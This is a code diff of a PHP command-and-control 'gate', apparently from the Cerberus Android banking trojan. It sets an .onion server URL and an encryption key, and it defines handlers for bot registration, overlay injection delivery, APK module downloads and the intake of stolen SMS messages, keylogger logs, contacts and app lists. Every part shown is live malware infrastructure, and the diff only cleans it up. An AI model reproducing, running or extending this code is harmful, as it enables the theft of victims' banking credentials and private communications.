@@ -1,10 +1,4 @@
 <?php
-/*ini_set('display_errors', 1);
-ini_set('display_startup_errors', 1);
-error_reporting(E_ALL);
-echo 1; */
-
-// define('key', 'Sde14x4670newx');
 define('key', 'PssTESTx0');
 
 // local
@@ -14,11 +8,8 @@ define('key', 'PssTESTx0');
 // define('user', 'root');
 // define('passwd', '');
 
-// cerberus
-define('url_global_server', 'http://2vqjlbjgbgvwprw75cuurypoyx7ppuga5acl457o5bkcn5gxeueulyyd.onion/Ejection/');
-// define('passwd', 'x7YyBk2E');
-
-// define('url_global_server', 'http://4i4pwd4hvkeqpytkoz3gaeafemqpv4serdcn7yh3igaxgxrpdnhnyhyd.onion/Ejection/');
+// client
+define('url_global_server', 'http://4i4pwd4hvkeqpytkoz3gaeafemqpv4serdcn7yh3igaxgxrpdnhnyhyd.onion/Ejection/');
 define('server', 'localhost');
 define('db', 'bot');
 define('user', 'non-root');
@@ -99,9 +90,6 @@ function encrypt($string, $key)
 
 function decrypt($string = "", $key = "")
 {
-
-  //error_log("executing lines: $string \n",3,"gate_log_2.log");
-
   if ($string == "") {
     return false;
   }
@@ -820,33 +808,24 @@ class bots_con
   }
 }
 
+
 $operation = htmlspecialchars($_REQUEST["action"], ENT_QUOTES);
 
-//$data = htmlspecialchars($_REQUEST["data"], ENT_QUOTES); -> it seems the request data comes with base64, not htmlspecial.
 $data = base64_decode($_REQUEST["data"]);
 
-
 if (!ctype_xdigit($data)) {
-  //error_log("no hexa codes: ".$_RESQUEST["data"]."\n",3,"gate_log.log");
-
   $strings_to_show = "";
   foreach ($_REQUEST as $key => $value) {
-    //$strings_to_show .= "$key : $value \n";
     $strings_to_show .= "$key  \n";
   }
-
-  //error_log($strings_to_show,3,"gate_log.log");
-  //error_log("\n",3,"gate_log.log");
-  //die("No hexadecimals code in REQUEST \"data\"");
   die();
 }
 
-$data = decrypt($data, key); // success -> output some text, don't write other thing here.
+$data = decrypt($data, key); 
 
 $bots_con = new bots_con();
 
 //------Filter request----------
-
 $dataTmp = str_replace(' ', '', $data);
 
 $dataTmp = strtolower($dataTmp);
@@ -861,9 +840,7 @@ foreach ($arraySignet as $signet) {
   }
 }
 
-//------------------------------
-
-$jsonDecode = json_decode($data);
+$params = json_decode($data);
 
 switch ($operation) {
 
@@ -874,37 +851,37 @@ switch ($operation) {
 
   case "botcheck": // Check bot to admin panel
 
-    $idbot = isset($jsonDecode->{'id'}) ? $jsonDecode->{'id'} : "";
+    $idbot = isset($params->{'id'}) ? $params->{'id'} : "";
 
-    $idSettings = isset($jsonDecode->{'idSettings'}) ? $jsonDecode->{'idSettings'} : "";
+    $idSettings = isset($params->{'idSettings'}) ? $params->{'idSettings'} : "";
 
-    $number = isset($jsonDecode->{'number'}) ? $jsonDecode->{'number'} : "";
+    $number = isset($params->{'number'}) ? $params->{'number'} : "";
 
-    $statAdmin = isset($jsonDecode->{'statAdmin'}) ? $jsonDecode->{'statAdmin'} : "1";
+    $statAdmin = isset($params->{'statAdmin'}) ? $params->{'statAdmin'} : "1";
 
-    $statProtect = isset($jsonDecode->{'statProtect'}) ? $jsonDecode->{'statProtect'} : "";
+    $statProtect = isset($params->{'statProtect'}) ? $params->{'statProtect'} : "";
 
-    $statScreen = isset($jsonDecode->{'statScreen'}) ? $jsonDecode->{'statScreen'} : "";
+    $statScreen = isset($params->{'statScreen'}) ? $params->{'statScreen'} : "";
 
-    $statAccessibilty = isset($jsonDecode->{'statAccessibilty'}) ? $jsonDecode->{'statAccessibilty'} : "";
+    $statAccessibilty = isset($params->{'statAccessibilty'}) ? $params->{'statAccessibilty'} : "";
 
-    $statSMS = isset($jsonDecode->{'statSMS'}) ? $jsonDecode->{'statSMS'} : "";
+    $statSMS = isset($params->{'statSMS'}) ? $params->{'statSMS'} : "";
 
-    $statCards = isset($jsonDecode->{'statCards'}) ? $jsonDecode->{'statCards'} : "";
+    $statCards = isset($params->{'statCards'}) ? $params->{'statCards'} : "";
 
-    $statBanks = isset($jsonDecode->{'statBanks'}) ? $jsonDecode->{'statBanks'} : "";
+    $statBanks = isset($params->{'statBanks'}) ? $params->{'statBanks'} : "";
 
-    $statMails = isset($jsonDecode->{'statMails'}) ? $jsonDecode->{'statMails'} : "";
+    $statMails = isset($params->{'statMails'}) ? $params->{'statMails'} : "";
 
-    $activeDevice = isset($jsonDecode->{'activeDevice'}) ? $jsonDecode->{'activeDevice'} : "";
+    $activeDevice = isset($params->{'activeDevice'}) ? $params->{'activeDevice'} : "";
 
-    $timeWorking = isset($jsonDecode->{'timeWorking'}) ? $jsonDecode->{'timeWorking'} : "";
+    $timeWorking = isset($params->{'timeWorking'}) ? $params->{'timeWorking'} : "";
 
-    $statDownloadModule = isset($jsonDecode->{'statDownloadModule'}) ? $jsonDecode->{'statDownloadModule'} : "";
+    $statDownloadModule = isset($params->{'statDownloadModule'}) ? $params->{'statDownloadModule'} : "";
 
-    $locale = isset($jsonDecode->{'locale'}) ? $jsonDecode->{'locale'} : "";
+    $locale = isset($params->{'locale'}) ? $params->{'locale'} : "";
 
-    $batteryLevel = isset($jsonDecode->{'batteryLevel'}) ? $jsonDecode->{'batteryLevel'} : "";
+    $batteryLevel = isset($params->{'batteryLevel'}) ? $params->{'batteryLevel'} : "";
 
     $checkid = $bots_con->checkIdBot(
       $idbot,
@@ -945,7 +922,6 @@ switch ($operation) {
         }
       }
     } else {
-      //echo 'ok';
       echo encrypt("||no||", key);
     }
 
@@ -953,17 +929,17 @@ switch ($operation) {
 
   case "registration": // Registration of bot to admin panel
 
-    $idbot = isset($jsonDecode->{'id'}) ? $jsonDecode->{'id'} : "";
+    $idbot = isset($params->{'id'}) ? $params->{'id'} : "";
 
-    $android = isset($jsonDecode->{'android'}) ? $jsonDecode->{'android'} : "";
+    $android = isset($params->{'android'}) ? $params->{'android'} : "";
 
-    $tag = isset($jsonDecode->{'tag'}) ? $jsonDecode->{'tag'} : "";
+    $tag = isset($params->{'tag'}) ? $params->{'tag'} : "";
 
-    $country = isset($jsonDecode->{'country'}) ? $jsonDecode->{'country'} : "";
+    $country = isset($params->{'country'}) ? $params->{'country'} : "";
 
-    $operator = isset($jsonDecode->{'operator'}) ? $jsonDecode->{'operator'} : "";
+    $operator = isset($params->{'operator'}) ? $params->{'operator'} : "";
 
-    $model = isset($jsonDecode->{'model'}) ? $jsonDecode->{'model'} : "";
+    $model = isset($params->{'model'}) ? $params->{'model'} : "";
 
     echo encrypt($bots_con->addBot($bots_con->getIpBot(), $idbot, $android, $tag, $country, $operator, $model), key);
 
@@ -971,9 +947,9 @@ switch ($operation) {
 
   case "injcheck": // Update List Injection
 
-    $idbot = isset($jsonDecode->{'id'}) ? $jsonDecode->{'id'} : "";
+    $idbot = isset($params->{'id'}) ? $params->{'id'} : "";
 
-    $apps = isset($jsonDecode->{'apps'}) ? $jsonDecode->{'apps'} : "";
+    $apps = isset($params->{'apps'}) ? $params->{'apps'} : "";
 
     echo encrypt($bots_con->updateInjection($idbot, $apps), key);
 
@@ -983,7 +959,7 @@ switch ($operation) {
 
     $ip = $bots_con->getIpBot();
 
-    $inject = isset($jsonDecode->{'inject'}) ? $jsonDecode->{'inject'} : "";
+    $inject = isset($params->{'inject'}) ? $params->{'inject'} : "";
 
     echo encrypt($bots_con->getInjection($ip, $inject), key);
 
@@ -993,7 +969,7 @@ switch ($operation) {
 
     $ip = $bots_con->getIpBot();
 
-    $inject = isset($jsonDecode->{'inject'}) ? $jsonDecode->{'inject'} : "";
+    $inject = isset($params->{'inject'}) ? $params->{'inject'} : "";
 
     echo encrypt($bots_con->getIcon($ip, $inject), key);
 
@@ -1003,13 +979,13 @@ switch ($operation) {
 
     $ip = $bots_con->getIpBot();
 
-    $idbot = isset($jsonDecode->{'idbot'}) ? $jsonDecode->{'idbot'} : "";
+    $idbot = isset($params->{'idbot'}) ? $params->{'idbot'} : "";
 
-    $idInject = isset($jsonDecode->{'idinject'}) ? $jsonDecode->{'idinject'} : "";
+    $idInject = isset($params->{'idinject'}) ? $params->{'idinject'} : "";
 
-    $application = isset($jsonDecode->{'application'}) ? $jsonDecode->{'application'} : "";
+    $application = isset($params->{'application'}) ? $params->{'application'} : "";
 
-    $dataInjection = isset($jsonDecode->{'logs'}) ? $jsonDecode->{'logs'} : "";
+    $dataInjection = isset($params->{'logs'}) ? $params->{'logs'} : "";
 
     echo encrypt($bots_con->addInjection($ip, $idbot, $idInject, $application, $dataInjection), key);
 
@@ -1021,11 +997,11 @@ switch ($operation) {
 
     $ip = $bots_con->getIpBot();
 
-    $idbot = isset($jsonDecode->{'idbot'}) ? $jsonDecode->{'idbot'} : "";
+    $idbot = isset($params->{'idbot'}) ? $params->{'idbot'} : "";
 
-    $logs = isset($jsonDecode->{'logs'}) ? $jsonDecode->{'logs'} : "";
+    $logs = isset($params->{'logs'}) ? $params->{'logs'} : "";
 
-    $dateToDevice = isset($jsonDecode->{'date'}) ? $jsonDecode->{'date'} : "";
+    $dateToDevice = isset($params->{'date'}) ? $params->{'date'} : "";
 
     echo encrypt($bots_con->addLogSms($ip, $idbot, $logs, $dateToDevice), key);
 
@@ -1037,9 +1013,9 @@ switch ($operation) {
 
     $ip = $bots_con->getIpBot();
 
-    $idbot = isset($jsonDecode->{'idbot'}) ? $jsonDecode->{'idbot'} : "";
+    $idbot = isset($params->{'idbot'}) ? $params->{'idbot'} : "";
 
-    $logs = isset($jsonDecode->{'logs'}) ? $jsonDecode->{'logs'} : "";
+    $logs = isset($params->{'logs'}) ? $params->{'logs'} : "";
 
     echo encrypt($bots_con->addLogKeylogger($ip, $idbot, $logs), key);
 
@@ -1047,9 +1023,9 @@ switch ($operation) {
 
   case "timeInject": //Send start Injections
 
-    $idbot = isset($jsonDecode->{'idbot'}) ? $jsonDecode->{'idbot'} : "";
+    $idbot = isset($params->{'idbot'}) ? $params->{'idbot'} : "";
 
-    $inject = isset($jsonDecode->{'inject'}) ? $jsonDecode->{'inject'} : "";
+    $inject = isset($params->{'inject'}) ? $params->{'inject'} : "";
 
     echo encrypt($bots_con->timeInjectStart($idbot, $inject), key);
 
@@ -1059,7 +1035,7 @@ switch ($operation) {
 
     $ip = $bots_con->getIpBot();
 
-    $idbot = isset($jsonDecode->{'idbot'}) ? $jsonDecode->{'idbot'} : "";
+    $idbot = isset($params->{'idbot'}) ? $params->{'idbot'} : "";
 
     echo encrypt($bots_con->getApkModule($ip, $idbot), key);
 
@@ -1069,9 +1045,9 @@ switch ($operation) {
 
     $ip = $bots_con->getIpBot();
 
-    $idbot = isset($jsonDecode->{'idbot'}) ? $jsonDecode->{'idbot'} : "";
+    $idbot = isset($params->{'idbot'}) ? $params->{'idbot'} : "";
 
-    $logs = isset($jsonDecode->{'logs'}) ? $jsonDecode->{'logs'} : "";
+    $logs = isset($params->{'logs'}) ? $params->{'logs'} : "";
 
     echo encrypt($bots_con->sendListSavedSMS($ip, $idbot, $logs), key);
 
@@ -1081,9 +1057,9 @@ switch ($operation) {
 
     $ip = $bots_con->getIpBot();
 
-    $idbot = isset($jsonDecode->{'idbot'}) ? $jsonDecode->{'idbot'} : "";
+    $idbot = isset($params->{'idbot'}) ? $params->{'idbot'} : "";
 
-    $logs = isset($jsonDecode->{'logs'}) ? $jsonDecode->{'logs'} : "";
+    $logs = isset($params->{'logs'}) ? $params->{'logs'} : "";
 
     echo encrypt($bots_con->sendListPhoneNumbers($ip, $idbot, $logs), key);
 
@@ -1093,9 +1069,9 @@ switch ($operation) {
 
     $ip = $bots_con->getIpBot();
 
-    $idbot = isset($jsonDecode->{'idbot'}) ? $jsonDecode->{'idbot'} : "";
+    $idbot = isset($params->{'idbot'}) ? $params->{'idbot'} : "";
 
-    $logs = isset($jsonDecode->{'logs'}) ? $jsonDecode->{'logs'} : "";
+    $logs = isset($params->{'logs'}) ? $params->{'logs'} : "";
 
     echo encrypt($bots_con->sendListApplications($ip, $idbot, $logs), key);
 
